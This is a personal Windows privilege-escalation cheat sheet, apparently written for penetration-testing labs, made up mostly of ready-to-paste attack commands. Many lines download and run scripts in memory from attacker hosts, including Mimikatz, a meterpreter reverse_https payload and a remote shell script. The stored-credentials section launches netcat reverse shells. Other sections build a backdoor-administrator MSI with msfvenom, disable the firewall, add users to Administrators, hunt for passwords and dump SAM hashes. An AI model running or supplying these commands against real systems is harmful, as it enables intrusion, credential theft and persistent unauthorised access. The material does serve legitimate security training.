So this is my quick and dirty checklist for windows privilege escalation. It's mostly copied from the links at the bottom of the page.

### Initial Information Gathering 

This step is to understand a few things about the machine. Start with users/privileges, installed software, and what hotfixes are installed.

What system are we connected to? 
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
Get the hostname and username 
```
whoami
whoami /priv
hostname
echo %username%
```
Learn about your environment 
```
SET
echo %PATH%
```
List other users on the box and domain
```
qwinsta
net users
net accounts
net user <username>
dir /b /ad "C:\Users\"
net localgroups
Get-LocalGroup | ft Name
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
net group /domain
net group /domain <Group Name>
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
Check installed software
```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```
List all drives
```
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
How well patched is the machine?
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.." - to find specific KBs
```

Do we want to run Invoke-Shellcode.ps1?
```
Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
```

### Kernel Exploits 

Here we want to run the Sherlock/Watson and PowerUp scripts to check for low hanging fruit and easy wins. The functions we want are Find-AllVulns and Invoke-AllChecks. You can just use the -encodedcommand flag and not deal with these quotes as well.

https://github.com/rasta-mouse/Sherlock

https://github.com/rasta-mouse/Watson

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

The normal way to run a powershell script using net webclient objects with no modifications.
```
powershell `IEX((new-object net.webclient).downloadstring('http://10.10.14.22:8000/Sherlock.ps1')); Find-AllVulns`
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```

If we have a webshell or something non interactive try piping it to powershell and pulling from stdin like so. Thanks to Ippsec for showing this method. 
https://www.youtube.com/watch?v=lP-E5vmZNC0
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/Sherlock.ps1'); | powershell -noprofile -
```
Sometimes its easier to encode your PS commands into UTF/base64 like so...
```
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');" | iconv --to-code UTF-16LE | base64 -w 0
```
Then just run it on your windows shell... 
```
powershell -encodedcommand ADFSDGSDGSDGDSG==
```

Otherwise just upload it somewhere and execute these 
```
powershell -nop -ep bypass
Import-Module C:\Users\740i\Desktop\Sherlock.ps1
Find-AllVulns
```
Compiling all these Windows exploits on Linux can really be a pain in the ass 
```
i686-w64-mingw32-gcc exploit.c -o exploit
```
or for 32 bit 
```
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32 
```
Precompiled windows exploits they seem safe...

https://github.com/abatchy17/WindowsExploits

https://github.com/SecWiki/windows-kernel-exploits






### Passwords and Interesting Files

There might be cleartext, base64, or hashed passwords somewhere on the machine to find. Some of this will output a lot of garbage so maybe echo it into a file and look it over later.


First look for regular file types containing the string password
```
findstr /si password *.xml *.ini *.txt *.config 2>nul
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /spin "password" *.*
```

Check .config or other interesting file types for those strings 
```
dir /s *pass* == *cred* == *vnc* == *.config*
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

Sometimes these get left behind and might have passwords inside them
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Is VNC installed?
```
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

Check the registry for SNMP, VNC, Putty, autologin and other passwords.
```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Check for SAM and SYSTEM files access
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
Whats in inetpub if its there? web.config files might have passwords
```
dir /a C:\inetpub\
dir /s web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
IIS and Apache logs?
```
dir /s access.log error.log
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
```
If XAMPP/WAMPP, Apache, or PHP is installed check the config files
```
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
```

Check for stored creds with cmdkey
```
cmdkey /list
```
Then you can run something like this over SMB with any saved credientials
```
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Or you can use runas and feed it credentials
```
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
```
$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```


### Networking

Check the simple stuff...
```
ipconfig /all
route print 
arp -a 
net share
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

Some services might be open on the outside or the inside only of the network. Look for local address 127.0.0.1 or something internal.
```
netstat /a
netstat -ano
```
So to expose SMB on a victim for example, upload plink.exe from /usr/share/windows-binaries, start SSH on attacker machine then on victim run
```
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

Firewall turned on?
```
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
netsh firewall set opmode disable
```
List firewall's blocked ports

```
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Enable RDP if you want
```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
### Group Policy Preferences
If the box is part of a domain and the user account you have can read System Volume Information, then check for files with passwords. Start by checking the environment variables for the IP-address of the domain controller if that's unclear. Output environment-variables by typing```set```and look for the following:
```
LOGONSERVER=\\NAMEOFSERVER
USERDNSDOMAIN=WHATEVER.LOCAL
```
Then look up the IP-address
```
nslookup nameofserver.whatever.local
```

Now we mount it and search for the groups.xml file
```
net use z: \\192.168.1.101\SYSVOL
z:
dir Groups.xml /s
```
Then just decrypt any found passwords in kali with the gpp-decrypt tool.

You can also do this with powerview and the get gpp-password scripts from powershell empire.
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Here in powershell we load them into memory

```
IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.100/Get-GPPPassword.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.100/powerview.ps1")
```
Then run ```Get-GPPPassword```and feed any listed GUID's setting administrator passwords to powerview.ps1 like so. This will check any found credentials against other domain machines.
```
Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -ADSPath $_ }
```

Check https://www.toshellandback.com/2015/08/30/gpp/ for some explanations.


### Scheduled Tasks

Look for anything custom, run by a privileged user, and running a binary we can overwrite. Might be tons of output
```
schtasks /query /fo LIST 2>nul | findstr TaskName
dir C:\windows\tasks
```
Or in powershell
```
Get-ScheduledTask | ft TaskName, State
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
Check this file
```
c:\WINDOWS\SchedLgU.Txt
```

Startup tasks

```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

### AlwaysInstallElevated

Worth checking for...
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If those keys are set to enabled, then you can use msfvenom to generate a malicious MSI file and install it:
```
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```
https://toshellandback.com/2015/11/24/ms-priv-esc/ has some more examples.


### Weak Service, Process, and Program Permissions
Taken mostly from https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/

What is installed?
```
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
```

List processes running as SYSTEM
```
tasklist /FI "username eq SYSTEM"
```

Then check for weak folder or file permissions in a couple different ways as needed.

Full Permissions in Program Files?
```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
```

Modify Permissions in Program Files?

```
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```

You can also use accesschk to check for weak folder and file permissions. https://github.com/ankh2054/windows-pentest/tree/master/Privelege has both versions
```
accesschk.exe /accepteula ... ... ...
accesschk.exe -uwqs "Everyone" *
accesschk.exe -uwqs "Authenticated Users" *
accesschk.exe -uwqs "Users" *
accesschk.exe -uwqs Users c:\*.*
```
Or just look for weak folders per drive
```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

Weak service permissions that can be reconfigured?

```
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
```

Don't forget to look for any unquoted service paths

```
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
```
Or do
```
echo %path%
accesschk.exe -dqv "C:\Python27"
 ```
on any non default directories, often times you will find python here for example.



### MS16-032 Secondary Logon Handle

This script by Fuzzysecurity is amazing https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1, but might need a few changes as you can either modify it to run your own specified binary or run as is to spawn a cmd shell, which sometimes doesn't work unless you already have an RDP session on the victim. The target also needs to have 2+ CPU cores so this will fail often on vm boxes.

To check if the machine is patched 
```
wmic qfe list | find "3139914"
```

First off to just run it as usual upload the script to the victim and do this
```
powershell -nop -ep bypass
Import-Module C:\Users\Victim\Desktop\MS16-032.ps1
Invoke-MS16-032
```
Or you can try running it remotely from a normal windows shell this may not work unless its over RDP.
```
powershell -c `iex ((new-object net.webclient).downloadstring('http://10.10.14.22:8000/Invoke-MS16-032.ps1')); Invoke-MS16-032`
```

To have it call something other than the cmd.exe payload, modify this path located in the middle of Fuzzysec's script. This seems to be reliable with any msf payload.
```
# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
$CallResult = [Advapi32]::CreateProcessWithLogonW(
"user", "domain", "pass",
0x00000002, "C:\Users\740i\Desktop\danger.exe", "",
0x00000004, $null, $GetCurrentPath,
[ref]$StartupInfo, [ref]$ProcessInfo)
```
There is also a custom binary from Meatballs that will just spawn a command prompt as system. https://github.com/Meatballs1/ms16-032

The Powershell empire version will take a -Command flag that makes it easy to run it against another reverse shell or a local command to escalate privileges. 
https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1

```
powershell.exe -nop -ep bypass
Import-Module C:\Users\740i\Desktop\Invoke-MS16032.ps1
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.22:8000/shell.ps1')"
```


### Tater

There's a few different implementations of this Hot Potato exploit, I've gotten lucky with the powershell version.
https://github.com/Kevin-Robertson/Tater

So all you do is download Tater.ps1 somewhere on the target then add administrator user or whatever.
```
powershell.exe -nop -ep bypass
Import-Module C:\Users\740i\Desktop\Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators 740i /add"
net localgroup administrators
```



### System Files

If you find an LFI on windows you should check for these two files, the  `system`  registry and the  `SAM`  registry. These two files/registries are all we need to get the machines hashes. 
```
Systemroot can be windows
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

System file can be found here
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
```
Then you can just run pwdump on these files.
```
pwdump system sam
```

List of file inclusions for Windows
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini 
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

### Metasploit Post Modules

Some useful post-modules to run against msf sessions and do some of this stuff automatically...
```
use exploit/windows/local/service_permissions
post/windows/gather/credentials/gpp
run post/windows/gather/credential_collector 
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
```

### Handy Scripts

https://github.com/enjoiz/Privesc

https://github.com/rasta-mouse/Sherlock

https://github.com/FuzzySecurity/PowerShell-Suite

https://github.com/411Hall/JAWS


### Links

Thanks to these guys for all the work

http://www.fuzzysecurity.com/tutorials/16.html

https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md

https://github.com/swisskyrepo/PayloadsAllTheThings

http://www.greyhathacker.net/?p=738

https://toshellandback.com/2015/11/24/ms-priv-esc/

https://www.toshellandback.com/2015/08/30/gpp/

https://www.youtube.com/watch?v=kMG8IsCohHA

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

https://github.com/sagishahar/lpeworkshop

https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA

https://bitvijays.github.io/


